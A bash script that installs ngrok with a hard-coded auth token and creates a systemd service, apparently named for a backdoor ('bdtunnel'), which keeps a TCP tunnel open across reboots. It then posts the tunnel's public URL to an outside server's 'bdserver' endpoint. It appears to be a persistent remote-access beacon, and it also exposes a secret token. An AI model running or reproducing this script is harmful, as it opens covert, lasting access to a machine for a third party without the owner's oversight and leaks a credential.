#!/bin/bash

# Define variables
NGROK_AUTH_TOKEN="2hgrdm6kJLIsFBigEstwbd4DNo4_515xtVwDbF9tUmWuDPDNa"
NGROK_PORT=50001
NGROK_DOWNLOAD_URL="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip"
NGROK_DIR="/usr/local/bin"
NGROK_ZIP="ngrok-stable-linux-amd64.zip"
POST_URL="https://nejan.serendibytes.com/cdn/bdserver/handle_ngrok_urls.php"

# Download and install ngrok
if ! command -v ngrok &> /dev/null; then
    echo "Downloading ngrok..."
    wget $NGROK_DOWNLOAD_URL -O $NGROK_ZIP
    unzip $NGROK_ZIP
    sudo mv ngrok $NGROK_DIR
    rm $NGROK_ZIP
fi

# Authenticate ngrok
ngrok config add-authtoken $NGROK_AUTH_TOKEN

# Create systemd service for ngrok
cat <<EOF | sudo tee /etc/systemd/system/bdtunnel.service
[Unit]
Description=ngrok tunnel service
After=network.target

[Service]
ExecStart=/usr/local/bin/ngrok tcp $NGROK_PORT --log=stdout
Restart=always
User=$USER
StandardOutput=syslog
StandardError=syslog
SyslogIdentifier=ngrok

[Install]
WantedBy=multi-user.target
EOF

# Reload systemd and enable ngrok service
sudo systemctl daemon-reload
sudo systemctl enable bdtunnel.service
sudo systemctl start bdtunnel.service

# Wait for ngrok to start and get the public URL
sleep 10
NGROK_URL=$(curl --silent http://127.0.0.1:4040/api/tunnels | jq -r '.tunnels[0].public_url')
echo "Ngrok URL: $NGROK_URL"

# Send the ngrok URL via HTTP POST
curl -X POST -d "url=$NGROK_URL" $POST_URL
